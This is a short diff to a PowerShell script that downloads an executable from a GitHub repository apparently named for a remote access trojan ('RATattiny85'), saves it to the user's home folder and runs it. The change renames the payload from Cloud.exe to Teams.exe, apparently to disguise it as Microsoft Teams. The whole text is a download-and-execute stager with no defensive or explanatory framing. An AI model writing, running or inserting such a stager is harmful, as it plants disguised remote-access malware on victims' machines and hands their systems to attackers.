@@ -1,6 +1,6 @@
-$url = "https://github.com/joyfulharbor/RATattiny85/raw/main/Cloud.exe"
-$outpath = "$home/Cloud.exe"
+$url = "https://github.com/joyfulharbor/RATattiny85/raw/main/Teams.exe"
+$outpath = "$home/Teams.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
 
 $args = @("Comma","Separated","Arguments")
-Start-Process -Filepath "$home/Cloud.exe" -ArgumentList $args
+Start-Process -Filepath "$home/Teams.exe" -ArgumentList $args
